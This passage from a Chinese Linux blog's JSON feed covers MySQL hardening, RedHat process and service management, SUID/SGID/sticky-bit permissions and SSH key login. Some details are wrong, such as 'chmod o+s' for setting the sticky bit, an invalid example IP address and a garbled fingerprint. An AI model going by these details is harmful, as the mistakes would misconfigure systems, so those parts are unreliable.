特别是在配置网络服务程序的时候。</p>\n<h2 id=\"关闭对-web-访问的支持\" tabindex=\"-1\"> 关闭对 Web 访问的支持</h2>\n<p>如果不打算让 Web 访问使用 MySQL 数据库, 没有提供诸如 PHP 这样的 Web 语言的时候, 重新设置或编译你的 PHP, 取消它们对 MySQL 的默认支持。假如服务器中使用 PHP 等 web 程序, 试试用 Web 形式非法的请求, 如果得到任何形式的 MySQL 错误, 立即分析原因, 及时修改 Web 程序, 堵住漏洞, 防止 MySQL 暴露在 web 面前。 对于 Web 的安全检查, 在 MySQL 官方文档中这么建议, 对于 web 应用, 至少检查以下清单:</p>\n<ul>\n<li>试试用 Web 形式输入单引号和双引号( <code>‘’’</code> 和 <code>‘”’</code> )。如果得到任何形式的 MySQL 错误, 立即分析原因。</li>\n<li>试试修改动态 URL, 可以在其中添加 <code>%22(‘”’)</code> 、 <code>%23(‘#’)</code> 和 <code>%27(‘’’)</code> 。</li>\n<li>试试在动态 URL 中修改数据类型, 使用前面示例中的字符, 包括数字和字符类型。你的应用程序应足够安全, 可以防范此类修改和类似攻击。</li>\n<li>试试输入字符、空格和特殊符号, 不要输入数值字段的数字。你的应用程序应在将它们传递到 MySQL 之前将它们删除或生成错误。将未经过检查的值传递给 MySQL 是很危险的！</li>\n<li>将数据传给 MySQL 之前先检查其大小。</li>\n<li>用管理账户之外的用户名将应用程序连接到数据库。不要给应用程序任何不需要的访问权限。</li>\n</ul>\n<h2 id=\"数据库备份策略\" tabindex=\"-1\"> 数据库备份策略</h2>\n<p>使用 <code>mysqldump</code> 可以把整个数据库装载到一个单独的文本文件中。这个文件包含有所有重建您的数据库所需要的 SQL 命令。</p>\n<div><pre><code>mysqldump -u root -p mysql <span>></span> abc.sql\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"mysqld-安全相关启动项\" tabindex=\"-1\"> mysqld 安全相关启动项</h2>\n<p>下列 <code>mysqld</code> 选项影响安全:</p>\n<ul>\n<li><strong><code>--allow-suspicious-udfs</code></strong></li>\n</ul>\n<p>-- 该选项控制是否可以载入主函数只有 xxx 符的用户定义函数。默认情况下, 该选项被关闭, 并且只能载入至少有辅助符的 UDF。这样可以防止从未包含合法 UDF 的共享对象文件载入函数。</p>\n<ul>\n<li><strong><code>--local-infile[={0|1}]</code></strong></li>\n</ul>\n<p>-- 如果用 <code>–local-infile=0</code> 启动服务器, 则客户端不能使用 LOCAL in LOAD DATA 语句。</p>\n<ul>\n<li><strong><code>--old-passwords</code></strong></li>\n</ul>\n<p>-- 强制服务器为新密码生成短( <code>pre-4.1</code> )密码哈希。当服务器必须支持旧版本客户端程序时, 为了保证兼容性这很有用。</p>\n<ul>\n<li><strong><code>(OBSOLETE) --safe-show-database</code></strong></li>\n</ul>\n<p>-- 在以前版本的 MySQL 中, 该选项使 <code>SHOW DATABASES</code> 语句只显示用户具有部分权限的数据库名。在 <code>MySQL 5.1</code> 中, 该选项不再作为现在的 默认行为使用, 有一个 <code>SHOW DATABASES</code> 权限可以用来控制每个账户对数据库名的访问。</p>\n<ul>\n<li><strong><code>--safe-user-create</code></strong></li>\n</ul>\n<p>-- 如果启用, 用户不能用 <code>GRANT</code> 语句创建新用户, 除非用户有 <code>mysql.user</code> 表的 <code>INSERT</code> 权限。如果你想让用户具有授权权限来创建新用户, 你应给用户授予下面的权限: <code>mysql&gt; GRANT INSERT(user) ON mysql.user TO ‘user_name’@'host_name’;</code> 这样确保用户不能直接更改权限列, 必须使用 GRANT 语句给其它用户授予该权限。</p>\n<ul>\n<li><strong><code>--secure-auth</code></strong></li>\n</ul>\n<p>-- 不允许鉴定有旧( <code>pre-4.1</code> )密码的账户。</p>\n<ul>\n<li><strong><code>--skip-grant-tables</code></strong></li>\n</ul>\n<p>-- 这个选项导致服务器根本不使用权限系统。这给每个人以完全访问所有的数据库的权力！（通过执行 <code>mysqladmin flush-privileges</code> 或 <code>mysqladmin eload</code> 命令, 或执行 <code>FLUSH PRIVILEGES</code> 语句, 你能告诉一个正在运行的服务器再次开始使用授权表。）</p>\n<ul>\n<li><strong><code>--skip-name-resolve</code></strong></li>\n</ul>\n<p>-- 主机名不被解析。所有在授权表的 Host 的列值必须是 IP 号或 localhost。</p>\n<ul>\n<li><strong><code>--skip-networking</code></strong></li>\n</ul>\n<p>-- 在网络上不允许 TCP/IP 连接。所有到 mysqld 的连接必须经由 Unix 套接字进行。</p>\n<ul>\n<li><strong><code>--skip-show-database</code></strong></li>\n</ul>\n<p>-- 使用该选项, 只允许有 <code>SHOW DATABASES</code> 权限的用户执行 <code>SHOW DATABASES</code> 语句, 该语句显示所有数据库名。不使用该选项, 允许所有用户执行 <code>SHOW DATABASES</code> , 但只显示用户有 <code>SHOW DATABASES</code> 权限或部分数据库权限的数据库名。请注意全局权限指数据库的权限。</p>\n",
      "image": "https://vxhly.github.io/assets/mysql-reinforce-1.png",
      "date_published": "2016-10-30T16:02:43.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "RedHat 系统安全加固（四）服务和进程管理",
      "url": "https://vxhly.github.io/views/liunx/service-and-process-management.html",
      "id": "https://vxhly.github.io/views/liunx/service-and-process-management.html",
      "summary": "前言\n本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统服务和进程的查看与关闭, 通俗的来说进程是运行起来的程序。唯一标示进程的是进程描述符（PID）, 在 linux 内核中是通过 task_struck 和 task_list 来定义和管理进程的。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统服务和进程的查看与关闭, 通俗的来说进程是运行起来的程序。唯一标示进程的是进程描述符（PID）, 在 linux 内核中是通过 task_struck 和 task_list 来定义和管理进程的。</p>\n</div>\n\n<h2 id=\"ps-查看系统进程\" tabindex=\"-1\"> ps 查看系统进程</h2>\n<div><p>命令作用</p>\n<p><code>ps</code> 命令用于报告当前系统的进程状态。可以搭配 <code>kill</code> 指令随时中断、删除不必要的程序。 <code>ps</code> 命令是最基本同时也是非常强大的进程查看命令, 使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等, 总之大部分信息都是可以通过执行该命令得到的。</p>\n</div>\n<h3 id=\"相关选项\" tabindex=\"-1\"> 相关选项</h3>\n<ul>\n<li><strong>-a</strong> -------------------- 显示所有终端机下执行的程序, 除了阶段作业领导者之外</li>\n<li><strong>a</strong> -------------------- 显示现行终端机下的所有程序, 包括其他用户的程序</li>\n<li><strong>-A</strong> -------------------- 显示所有程序</li>\n<li><strong>-u&lt;用户识别码&gt;</strong> -------------------- 此选项的效果和指定 <code>&quot;-U&quot;</code> 选项相同</li>\n<li><strong>u</strong> -------------------- 以用户为主的格式来显示程序状况</li>\n<li><strong>-U&lt;用户识别码&gt;</strong> -------------------- 列出属于该用户的程序的状况, 也可使用用户名称来指定</li>\n<li><strong>U&lt;用户名称&gt;</strong> -------------------- 列出属于该用户的程序的状况</li>\n<li><strong>-e</strong> -------------------- 此选项的效果和指定 <code>&quot;A&quot;</code> 选项相同</li>\n<li><strong>e</strong> -------------------- 列出程序时, 显示每个程序所使用的环境变量</li>\n<li><strong>-f</strong> -------------------- 显示 UID, PPIP, C 与 STIME 栏位</li>\n<li><strong>f</strong> -------------------- 用 ASCII 字符显示树状结构, 表达程序间的相互关系</li>\n</ul>\n<h3 id=\"示例\" tabindex=\"-1\"> 示例</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>ps</span> aux <span>|</span> <span>grep</span> <span>ssh</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/process-1.png\" alt=\"RedHat 安全加固\"></p>\n<h2 id=\"netstat-查看网络情况\" tabindex=\"-1\"> netstat 查看网络情况</h2>\n<p>netstat 命令用来打印 Linux 中网络系统的状态信息, 可让你得知整个 Linux 系统的网络情况。</p>\n<h3 id=\"相关选项-1\" tabindex=\"-1\"> 相关选项</h3>\n<ul>\n<li><strong>-t 或 --tcp</strong> -------------------- 显示 TCP 传输协议的连线状况</li>\n<li><strong>-u 或 --udp</strong> -------------------- 显示 UDP 传输协议的连线状况</li>\n<li><strong>-n 或 --numeric</strong> -------------------- 直接使用 ip 地址, 而不通过域名服务器</li>\n<li><strong>-p 或 --programs</strong> -------------------- 显示正在使用 Socket 的程序识别码和程序名称</li>\n<li><strong>-l 或 --listening</strong> -------------------- 显示监控中的服务器的 Socket</li>\n</ul>\n<h3 id=\"示例-1\" tabindex=\"-1\"> 示例</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>netstat</span> -tulnp\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/process-2.png\" alt=\"RedHat 安全加固\"></p>\n<h2 id=\"chkconfig-查看系统服务\" tabindex=\"-1\"> chkconfig 查看系统服务</h2>\n<div><p>命令作用</p>\n<p>chkconfig 命令检查、设置系统的各种服务。这是 Red Hat 公司遵循 GPL 规则所开发的程序, 它可查询操作系统在每一个执行等级中会执行哪些系统服务, 其中包括各类常驻服务。谨记 chkconfig 不是立即自动禁止或激活一个服务, 它只是简单的改变了符号连接。</p>\n</div>\n<h3 id=\"选项解释\" tabindex=\"-1\"> 选项解释</h3>\n<ul>\n<li><strong>--add</strong> -------------------- 增加所指定的系统服务, 让 <code>chkconfig</code> 指令得以管理它, 并同时在系统启动的叙述文件内增加相关数据；</li>\n<li><strong>--del</strong> -------------------- 删除所指定的系统服务, 不再由 <code>chkconfig</code> 指令管理, 并同时在系统启动的叙述文件内删除相关数据；</li>\n<li><strong>--level&lt;等级代号&gt;</strong> -------------------- 指定读系统服务要在哪一个执行等级中开启或关毕。</li>\n</ul>\n<p>-- 等级 <code>0</code> 表示 -------------------- 表示关机 -- 等级 <code>1</code> 表示 -------------------- 单用户模式 -- 等级 <code>2</code> 表示 -------------------- 无网络连接的多用户命令行模式 -- 等级 <code>3</code> 表示 -------------------- 有网络连接的多用户命令行模式 -- 等级 <code>4</code> 表示 -------------------- 不可用 -- 等级 <code>5</code> 表示 -------------------- 带图形界面的多用户模式 -- 等级 <code>6</code> 表示 -------------------- 重新启动</p>\n<ul>\n<li><strong>--list</strong> -------------------- 列出系统服务列表</li>\n</ul>\n<h3 id=\"示例-2\" tabindex=\"-1\"> 示例</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>chkconfig</span> --list\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/process-3.png\" alt=\"RedHat 安全加固\"></p>\n<h2 id=\"关闭进程或服务\" tabindex=\"-1\"> 关闭进程或服务</h2>\n<h3 id=\"kill-杀死进程\" tabindex=\"-1\"> kill 杀死进程</h3>\n<div><p>命令作用</p>\n<p>kill 命令用来删除执行中的程序或工作。kill 可将指定的信息送至程序。预设的信息为 SIGTERM(15), 可将指定程序终止。若仍无法终止该程序, 可使用 SIGKILL(9) 信息尝试强制删除程序。程序或工作的编号可利用 ps 指令或 job 指令查看。</p>\n</div>\n<h4 id=\"选项解释-1\" tabindex=\"-1\"> 选项解释</h4>\n<ul>\n<li><strong>-a</strong>-------------------- 当处理当前进程时, 不限制命令名和进程号的对应关系；</li>\n<li><strong>-l &lt;信息编号&gt;</strong>-------------------- 若不加 <code>&lt;信息编号&gt;</code> 选项, 则 <code>-l</code> 参数会列出全部的信息名称；</li>\n<li><strong>p</strong>-------------------- 指定 kill 命令只打印相关进程的进程号, 而不发送任何信号；</li>\n<li><strong>-s &lt;信息名称或编号&gt;</strong>-------------------- 指定要送出的信息；</li>\n<li><strong>-u</strong>-------------------- 指定用户。 参数</li>\n</ul>\n<p>只有第 9 种信号( <code>SIGKILL</code> )才可以无条件终止进程, 其他信号进程都有权利忽略, 下面是常用的信号--------------------</p>\n<ul>\n<li><strong>HUP</strong> 1 终端断线</li>\n<li><strong>INT</strong> 2 中断（同 <code>Ctrl + C</code> ）</li>\n<li><strong>QUIT</strong> 3 退出（同 <code>Ctrl + \\</code> ）</li>\n<li><strong>TERM</strong> 15 终止</li>\n<li><strong>KILL</strong> 9 强制终止</li>\n<li><strong>CONT</strong> 18 继续（与 <code>STOP</code> 相反, <code>fg/bg</code> 命令）</li>\n<li><strong>STOP</strong> 19 暂停（同 <code>Ctrl + Z</code> ）</li>\n</ul>\n<h4 id=\"示例-3\" tabindex=\"-1\"> 示例</h4>\n<p>用 ps 查找进程, 然后用 kill 杀掉, <code>For Examlpe:</code></p>\n<div><pre><code><span>ps</span> -ef <span>|</span> <span>grep</span> <span>ssh</span>\n<span>kill</span> <span>4456</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>用 netstat 查找进程, 然后用 kill 杀掉, <code>For Examlpe:</code></p>\n<div><pre><code><span>netstat</span> -tulnp <span>|</span> <span>grep</span> <span>ssh</span>\n<span>kill</span> <span>4456</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/process-4.png\" alt=\"RedHat 安全加固\"></p>\n<h3 id=\"service-关闭服务\" tabindex=\"-1\"> service 关闭服务</h3>\n<div><p>命令作用</p>\n<p>service 命令是 Redhat Linux 兼容的发行版中用来控制系统服务的实用工具, 它以启动、停止、重新启动和关闭系统服务, 还可以显示所有系统服务的当前状态。</p>\n</div>\n<h4 id=\"选项信息\" tabindex=\"-1\"> 选项信息</h4>\n<ul>\n<li><strong>-h</strong>-------------------- 显示帮助信息；</li>\n<li><strong>--status-all</strong>-------------------- 显示所服务的状态。</li>\n</ul>\n<h4 id=\"示例-4\" tabindex=\"-1\"> 示例</h4>\n<p><code>For Examlpe:</code></p>\n<div><pre><code><span>service</span> mysqld status\n<span>service</span> mysqld stop\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/process-5.png\" alt=\"RedHat 安全加固\"></p>\n<p>那么要是系统没有 <code>service</code> 命令, 怎么办呢? Liunx 系统下是所有的服务名是存放在 <code>/etc/init.d/</code> 下的, 所以也可以使用以下命令来停止服务, <code>For Examlpe:</code></p>\n<div><pre><code>/etc/init.d/named status\n/etc/init.d/named stop\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/process-6.png\" alt=\"RedHat 安全加固\"></p>\n<h3 id=\"chkconfig-删除服务\" tabindex=\"-1\"> chkconfig 删除服务</h3>\n<h4 id=\"示例-5\" tabindex=\"-1\"> 示例</h4>\n<p><code>For Examlpe:</code></p>\n<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> <span>sendmail</span>\n<span>chkconfig</span> --del <span>sendmail</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/process-7.png\" alt=\"RedHat 安全加固\"></p>\n",
      "image": "https://vxhly.github.io/assets/process-1.png",
      "date_published": "2016-10-19T11:01:04.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 学习笔记（七）文件的特殊权限",
      "url": "https://vxhly.github.io/views/liunx/special-permissions-for-files.html",
      "id": "https://vxhly.github.io/views/liunx/special-permissions-for-files.html",
      "summary": "前言\n本篇是 Liunx 的学习笔记系列第七篇, 在 Liunx 中文件除了 rwx 权限, 还存在 SetUID 、 SetGID 、 Sicky BIT 特殊权限, 本篇就是来介绍这些特殊权限。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的学习笔记系列第七篇, 在 Liunx 中文件除了 rwx 权限, 还存在 SetUID 、 SetGID 、 Sicky BIT 特殊权限, 本篇就是来介绍这些特殊权限。</p>\n</div>\n\n<h2 id=\"setuid\" tabindex=\"-1\"> SetUID</h2>\n<h3 id=\"针对文件的作用\" tabindex=\"-1\"> 针对文件的作用</h3>\n<ul>\n<li>只有可以执行的二进制程序才能设定 SUID 权限</li>\n<li>命令执行者要对该程序用于 x（执行）权限</li>\n<li>命令执行者在执行该程序是获得该程序文件属主的身份（在执行程序的过程中灵魂附体成文件的属主）</li>\n<li>SetUID 权限只在该程序执行过程中有效, 也就是说身份改变只在程序执行过程中有效</li>\n</ul>\n<h3 id=\"概念图\" tabindex=\"-1\"> 概念图</h3>\n<p><img src=\"/assets/setuid-1.png\" alt=\"SetUID\"></p>\n<h3 id=\"设置-suid\" tabindex=\"-1\"> 设置 SUID</h3>\n<p>只能针对二进制可执行文件</p>\n<h4 id=\"_4-代表-suid\" tabindex=\"-1\"> 4 代表 SUID</h4>\n<p><code>Command Format:</code></p>\n<div><pre><code><span>chmod</span> <span>4777</span> <span>[</span>fileName<span>]</span>     <span># 设置 SUID 权限</span>\n<span>chmod</span> <span>644</span> <span>[</span>fileName<span>]</span>      <span># 取消 SUID 权限</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>当然还可以用以下命令设置, <code>Command Format:</code></p>\n<div><pre><code><span>chmod</span> u+s <span>[</span>fileName<span>]</span>      <span># 设置 SUID 权限</span>\n<span>chmod</span> u-s <span>[</span>fileName<span>]</span>      <span># 取消 SUID 权限</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h4 id=\"s-与-s-的区别\" tabindex=\"-1\"> S 与 s 的区别</h4>\n<div><p>提示</p>\n<p>区别大写 <code>S</code> 其实是报错, 因为我们用来测试的文件并非二进制文件, 或者说是可执行程序, 只需添加 x 权限即可变为小写 <code>s</code> , 实际上生效的是小写 <code>s</code></p>\n</div>\n<p><code>For Examlpe:</code> <br></p>\n<p><img src=\"/assets/setuid-2.png\" alt=\"SetUID\"></p>\n<h3 id=\"危险的-setuid\" tabindex=\"-1\"> 危险的 SetUID</h3>\n<ul>\n<li>关键目录应严格控制写权限。比如 <code>“/”</code> 、 <code>”/usr“</code> 等</li>\n<li>用户的密码设置要严格遵守密码三原则</li>\n<li>对系统中默认应该具有 SetUID 权限的文件作一列表, 定时检查没有这个之外的文件是否被设置了 SetUID 权限</li>\n</ul>\n<h2 id=\"setgid\" tabindex=\"-1\"> SetGID</h2>\n<p>既可以针对二进制可执行文件, 也可以针对目录</p>\n<h3 id=\"针对文件的作用-1\" tabindex=\"-1\"> 针对文件的作用</h3>\n<ul>\n<li>只有可以执行的二进制程序才能设定 SGID 权限</li>\n<li>命令执行者要对该程序用于 x（执行）权限</li>\n<li>命令执行者在执行该程序的时候, 组身份升级为该程序的属组</li>\n<li>SetUID 权限同样只在该程序执行过程中有效, 也就是说组身份改变只在程序执行过成中有效</li>\n</ul>\n<h3 id=\"针对目录的作用\" tabindex=\"-1\"> 针对目录的作用</h3>\n<ul>\n<li>普通用户必须对此目录拥有 r 和 x 权限, 才能进入此目录</li>\n<li>普通用户在此目录中的有效组会变成此目录的属组</li>\n<li>若普通用户对此目录拥有 w 权限时, 新建的文件的默认属组是这个目录的属组</li>\n</ul>\n<h3 id=\"设置-sgid\" tabindex=\"-1\"> 设置 SGID</h3>\n<h4 id=\"_2-代表-sgid\" tabindex=\"-1\"> 2 代表 SGID</h4>\n<p><code>Command Format:</code></p>\n<div><pre><code><span>chmod</span> <span>2777</span> <span>[</span>fileName<span>]</span>      <span># 设置 SGID 权限</span>\n<span>chmod</span> <span>644</span> <span>[</span>fileName<span>]</span>       <span># 取消 SGID 权限</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>当然还可以用以下命令设置, <code>Command Format:</code></p>\n<div><pre><code><span>chmod</span> g+s <span>[</span>fileName<span>]</span>       <span># 设置 SGID 权限</span>\n<span>chmod</span> g-s <span>[</span>fileName<span>]</span>      <span># 取消 SGID 权限</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h4 id=\"s-与-s-的区别-1\" tabindex=\"-1\"> S 与 s 的区别</h4>\n<div><p>提示</p>\n<p>区别大写 S 其实是报错, 因为我们用来测试的文件并非二进制文件, 或者说是可执行程序, 只需添加 x 权限即可变为小写 s</p>\n</div>\n<p><code>For Examlpe:</code> <br></p>\n<p><img src=\"/assets/setgid.png\" alt=\"SetUID\"></p>\n<h2 id=\"sicky-bit\" tabindex=\"-1\"> Sicky BIT</h2>\n<p>只能针对目录</p>\n<h3 id=\"针对目录的作用-1\" tabindex=\"-1\"> 针对目录的作用</h3>\n<h3 id=\"设置-sbit\" tabindex=\"-1\"> 设置 SBIT</h3>\n<ul>\n<li>粘着位目前对目录有效</li>\n<li>普通用户对该目录拥有 w 和 x 权限, 即普通用户可以在此目录拥有写入权限</li>\n<li>如果没有粘着位, 因为普通用户拥有 w 权限, 所以可以删除此目录下所有文件, 包括其他用户建立的文件。一但赋予粘着位, 除了 root 可以删除所有文件, 普通用户就算拥有 w 权限, 也只能删除自己建立的文件, 但是不能删除其他用户建立的文件</li>\n</ul>\n<h4 id=\"_1-代表-sbit\" tabindex=\"-1\"> 1 代表 SBIT</h4>\n<p><code>Command Format:</code></p>\n<div><pre><code><span>chmod</span> <span>1777</span> <span>[</span>folderName<span>]</span>       <span># 设置 SBIT 权限</span>\n<span>chmod</span> <span>644</span> <span>[</span>folderName<span>]</span>        <span># 取消 SBIT 权限</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>当然还可以用以下命令设置, <code>Command Format:</code></p>\n<div><pre><code><span>chmod</span> o+s <span>[</span>folderName<span>]</span>       <span># 设置 SBIT 权限</span>\n<span>chmod</span> o-t <span>[</span>folderName<span>]</span>       <span># 取消 SBIT 权限</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h4 id=\"举例\" tabindex=\"-1\"> 举例</h4>\n<p><code>For Examlpe:</code> <br></p>\n<p><img src=\"/assets/sticky-bit.png\" alt=\"SetUID\"></p>\n",
      "image": "https://vxhly.github.io/assets/setuid-1.png",
      "date_published": "2016-10-14T19:25:27.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "浅谈 SSH 服务",
      "url": "https://vxhly.github.io/views/liunx/talk-ssh-service.html",
      "id": "https://vxhly.github.io/views/liunx/talk-ssh-service.html",
      "summary": "前言\nSSH 是每一台 Linux 系统的标准配置服务, 本文将总结 SSH 的常见用法。\n\n",
      "content_html": "<div><p>前言</p>\n<p>SSH 是每一台 Linux 系统的标准配置服务, 本文将总结 SSH 的常见用法。</p>\n</div>\n\n<h2 id=\"什么是-ssh\" tabindex=\"-1\"> 什么是 SSH</h2>\n<p>SSH 为 <code>Secure Shell</code> 的缩写, 中文名字为安全外壳协议。SSH 是目前较可靠, 专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。需要指出的是, SSH 只是一种协议, 存在多种实现, 既有商业实现, 也有开源实现。</p>\n<h1 id=\"基本用法\" tabindex=\"-1\"> 基本用法</h1>\n<p>SSH 主要用于远程登录, 只要一条简单命令就可以了。</p>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>如果本地用户名与远程用户名一致, 登录时可以省略用户名。</p>\n<div><pre><code><span>ssh</span> <span>[</span>hostIP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>SSH 的默认端口是 22, 当然也可以使用 <code>-p</code> 修改这个端口。</p>\n<div><pre><code><span>ssh</span> -p <span>[</span>port<span>]</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"中间人攻击\" tabindex=\"-1\"> 中间人攻击</h2>\n<p>SSH 之所以能够保证安全, 原因在于它采用了公钥加密。</p>\n<p>整个过程是这样的:</p>\n<ul>\n<li>远程主机收到用户的登录请求, 把自己的公钥发给用户。</li>\n<li>用户使用这个公钥, 将登录密码加密后, 发送回来。</li>\n<li>远程主机用自己的私钥, 解密登录密码, 如果密码正确, 就同意用户登录。</li>\n</ul>\n<p>这个过程本身是安全的, 但是实施的时候存在一个风险: 如果有人截获了登录请求, 然后冒充远程主机, 将伪造的公钥发给用户, 那么用户很难辨别真伪。因为不像 https 协议, SSH 协议的公钥是没有证书中心（CA）公证的, 也就是说, 都是自己签发的。</p>\n<p>可以设想, 如果攻击者插在用户与远程主机之间（比如在公共的 wifi 区域）, 用伪造的公钥, 获取用户的登录密码。再用这个密码登录远程主机, 那么 SSH 的安全机制就荡然无存了。</p>\n<p>这种风险就是著名的<a href=\"http://en.wikipedia.org/wiki/Man-in-the-middle_attack\" target=\"_blank\" rel=\"noopener noreferrer\">&quot;中间人攻击&quot;</a>（Man-in-the-middle attack）。</p>\n<h2 id=\"口令登录\" tabindex=\"-1\"> 口令登录</h2>\n<p>如果你是第一次登录对方主机, 系统会出现下面的提示:</p>\n<div><p>提示</p>\n<p>The authenticity of host 'host (12.18.429.21)' can't be established.<br> RSA key fingerprint is 98:2e:d7:e0🇩🇪9f:ac:67:28:c2:42:2d:37:16:58:4d.<br> Are you sure you want to continue connecting (yes/no)?</p>\n</div>\n<p>这段话的意思是, 无法确认 host 主机的真实性, 只知道它的公钥指纹, 问你还想继续连接吗?</p>\n<p>所谓&quot;公钥指纹&quot;, 是指公钥长度较长（这里采用 RSA 算法, 长达 1024 位）, 很难比对, 所以对其进行 MD5 计算, 将它变成一个 128 位的指纹。上例中是 <code>98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d</code> , 再进行比较, 就容易多了。</p>\n<p>很自然的一个问题就是, 用户怎么知道远程主机的公钥指纹应该是多少? 回答是没有好办法, 远程主机必须在自己的网站上贴出公钥指纹, 以便用户自行核对。</p>\n<p>假定经过风险衡量以后, 用户决定接受这个远程主机的公钥。</p>\n<div><p>提示</p>\n<p>Are you sure you want to continue connecting (yes/no)? yes</p>\n</div>\n<p>系统会出现一句提示, 表示 host 主机已经得到认可。</p>\n<div><p>提示</p>\n<p>Warning: Permanently added 'host, 12.18.429.21' (RSA) to the list of known hosts.</p>\n</div>\n<p>然后, 会要求输入密码。</p>\n<div><p>提示</p>\n<p>Password: (enter password)</p>\n</div>\n<p>如果密码正确, 就可以登录了。</p>\n<p>当远程主机的公钥被接受以后, 它就会被保存在文件 <code>$HOME/.ssh/known_hosts</code> 之中。下次再连接这台主机, 系统就会认出它的公钥已经保存在本地了, 从而跳过警告部分, 直接提示输入密码。</p>\n<p>每个 SSH 用户都有自己的 <code>known_hosts</code> 文件, 此外系统也有一个这样的文件, 通常是 <code>/etc/ssh/ssh_known_hosts</code> , 保存一些对所有用户都可信赖的远程主机的公钥。</p>\n<h2 id=\"公钥登录\" tabindex=\"-1\"> 公钥登录</h2>\n<p>使用密码登录, 每次都必须输入密码, 非常麻烦。好在 SSH 还提供了公钥登录, 可以省去输入密码的步骤。</p>\n<p>所谓&quot;公钥登录&quot;, 原理很简单, 就是用户将自己的公钥储存在远程主机上。登录的时候, 远程主机会向用户发送一段随机字符串, 用户用自己的私钥加 密后, 再发回来。远程主机用事先储存的公钥进行解密, 如果成功, 就证明用户是可信的, 直接允许登录 shell, 不再要求密码。</p>\n<p>这种方法要求用户必须提供自己的公钥。如果没有现成的, 可以直接用 ssh-keygen 生成一个:</p>\n<div><pre><code>ssh-keygen\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>运行上面的命令以后, 系统会出现一系列提示, 可以一路回车。其中有一个问题是, 要不要对私钥设置口令（passphrase）, 如果担心私钥的安全, 这里可以设置一个。</p>\n<p>运行结束以后, 在 <code>$HOME/.ssh/</code> 目录下, 会新生成两个文件: <code>id_rsa.pub</code> 和 <code>id_rsa</code> 。前者是你的公钥, 后者是你的私钥。</p>\n<p>这时再输入下面的命令, 将公钥传送到远程主机 host 上面:</p>\n<div><pre><code>ssh-copy-id <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>好了, 从此你再登录, 就不需要输入密码了。</p>\n<h2 id=\"authorized-keys-文件\" tabindex=\"-1\"> authorized_keys 文件</h2>\n<p>远程主机将用户的公钥, 保存在登录后的用户主目录的 <code>$HOME/.ssh/authorized_keys</code> 文件中。公钥就是一段字符串, 只要把它追加在 authorized_keys 文件的末尾就行了。</p>\n<p>这里不使用上面的 <code>ssh-copy-id</code> 命令, 改用下面的命令, 解释公钥的保存过程:</p>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'mkdir .ssh &amp;&amp; cat >> .ssh/authorized_keys'</span> <span>&lt;</span> ~/.ssh/id_rsa.pub\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这条命令由多个语句组成, 依次分解开来看:</p>\n<ul>\n<li><strong><code>ssh [userName]@[hostIP]</code></strong>, 表示登录远程主机</li>\n<li>单引号中的 <strong><code>mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys</code></strong>, 表示登录后在远程 shell 上执行的命令</li>\n<li><strong><code>mkdir .ssh</code></strong> 的作用是, 如果用户主目录中的 .ssh 目录不存在, 就创建一个</li>\n<li><strong><code>cat &gt;&gt; .ssh/authorized_keys' &lt; ~/.ssh/id_rsa.pub</code></strong> 的作用是, 将本地的公钥文件 <code>~/.ssh/id_rsa.pub</code> , 重定向追加到远程文件 authorized_keys 的末尾。</li>\n</ul>\n<p>写入 authorized_keys 文件后, 公钥登录的设置就完成了。</p>\n<h2 id=\"远程操作\" tabindex=\"-1\"> 